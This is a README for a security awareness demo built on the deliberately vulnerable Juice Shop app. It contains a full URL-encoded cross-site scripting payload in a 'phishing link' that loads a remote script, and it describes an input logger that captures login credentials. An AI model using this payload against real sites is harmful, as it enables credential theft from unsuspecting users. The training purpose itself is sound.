# shake-logger
This projects provides a logger and a connected harlem shake js.

# Juice Shop
This projects helps in awareness trainings, specally with the [juice shop](https://github.com/bkimminich/juice-shop).
You can use it via docker and docker-compose running:
´docker-compose up´

To show the possible impact of [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab credentials! This could easily run on a 3rd party server in real life!

> You can also find a recording of this attack in action on YouTube:
> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
